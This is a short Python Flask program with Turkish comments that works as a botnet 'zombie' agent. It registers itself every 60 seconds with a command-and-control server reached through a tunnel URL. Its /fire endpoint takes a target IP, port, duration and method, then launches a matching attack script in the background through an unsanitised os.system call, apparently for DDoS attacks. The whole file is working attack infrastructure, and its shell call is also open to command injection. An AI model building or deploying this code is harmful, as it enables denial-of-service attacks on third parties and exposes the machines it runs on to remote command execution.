import os
import requests
import time
import threading
from flask import Flask, request

app = Flask(__name__)

# --- AYARLAR ---
# Playit linkini buraya eksiksiz yaz kanka
BEYIN_URL = "http://usb-metallic.gl.joinmc.link" 
ZOMBI_PORT = "8080"

def kayit_ol():
    """Zombi her açıldığında ve 60 saniyede bir Beyin'e kendini hatırlatır."""
    while True:
        try:
            # Beyin'e kayıt isteği gönderir
            requests.get(f"{BEYIN_URL}/kayit?port={ZOMBI_PORT}", timeout=10)
        except:
            pass
        time.sleep(60)

@app.route('/fire')
def fire():
    target = request.args.get('ip')
    port = request.args.get('port')
    sure = request.args.get('time')
    method = request.args.get('method')
    
    if method:
        # Arka planda ilgili method dosyasını tetikler
        os.system(f"nohup python3 {method}.py {target} {port} {sure} > /dev/null 2>&1 &")
        return f"Saldırı başladı: {method}", 200
    return "Method belirtilmedi", 400

@app.route('/ping')
def ping():
    return "PONG", 200

if __name__ == '__main__':
    # Kayıt olma işlemini ana programı durdurmadan arka planda başlatır
    threading.Thread(target=kayit_ol, daemon=True).start()
    app.run(host='0.0.0.0', port=int(ZOMBI_PORT))
